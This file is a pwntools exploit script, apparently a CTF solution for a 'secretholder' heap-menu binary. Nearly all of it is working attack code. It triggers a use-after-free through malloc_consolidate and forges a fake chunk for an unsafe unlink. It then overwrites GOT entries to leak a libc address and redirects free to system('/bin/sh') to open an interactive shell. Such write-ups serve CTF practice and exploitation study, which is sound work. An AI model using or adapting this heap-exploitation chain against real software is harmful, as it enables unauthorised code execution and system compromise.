#!/usr/bin/env python3

from pwn import *

exe = ELF("./secretholder")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def keep(level, secret):
    	r.sendline("1")
    	r.recvuntil("Which level of secret do you want to keep?")

    	if level == "small":
    		r.sendline("1")
    	elif level == "big":
    		r.sendline("2")
    	elif level == "huge":
    		r.sendline("3")

    	r.recvuntil("Tell me your secret: ")
    	r.send(secret)

    def wipe(level):
    	r.sendline("2")
    	r.recvuntil("Which Secret do you want to wipe?")

    	if level == "small":
    		r.sendline("1")
    	elif level == "big":
    		r.sendline("2")
    	elif level == "huge":
    		r.sendline("3")

    def renew(level, secret):
    	r.sendline("3")
    	r.recvuntil("Which Secret do you want to renew?")

    	if level == "small":
    		r.sendline("1")
    	elif level == "big":
    		r.sendline("2")
    	elif level == "huge":
    		r.sendline("3")

    	r.recvuntil("Tell me your secret: ")
    	r.send(secret)


    # increase mmap threshold in order to malloc(huge)
    keep("huge", "A")
    wipe("huge")

    keep("small", "A"*0x28)
    wipe("small")

    # trigger malloc_consolidate() and receive chunk from previous small secret -> UAF
    keep("big", "B"*0x28)
    wipe("small")

    keep("small", "A"*0x28)
    keep("huge", "B"*0x28)

    # unsafe unlink with small chunk -> because it still works since it is smallbin
    fake_chunk = ""
    fake_chunk += p64(0) # prev_size
    fake_chunk += p64(0x20) # size
    fake_chunk += p64(0x006020b0 - 0x18) # fd
    fake_chunk += p64(0x006020b0 - 0x10) # bk
    fake_chunk += p64(0x20) # prev_size of next_chunk
    fake_chunk += p64(0x61a91 - 1) # size of next_chunk

    renew("big", fake_chunk)
    wipe("huge")

    renew("small", "\x00"*8 + p64(exe.got['free']) + p64(exe.got['puts']))
    renew("big", p64(exe.symbols['puts']))

    wipe("huge")

    r.recvuntil('\x90')
    leak = u64( '\x90' + r.recvn(5) + "\x00\x00")
    libc.address = leak - libc.symbols['puts']
    log.info("libc base address: {}".format(hex(libc.address)))

    renew("small", "\x00"*8 + p64(exe.got['free']) + p64(next(libc.search('/bin/sh\x00'))))
    renew("big", p64(libc.symbols['system']))

    wipe("huge")
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
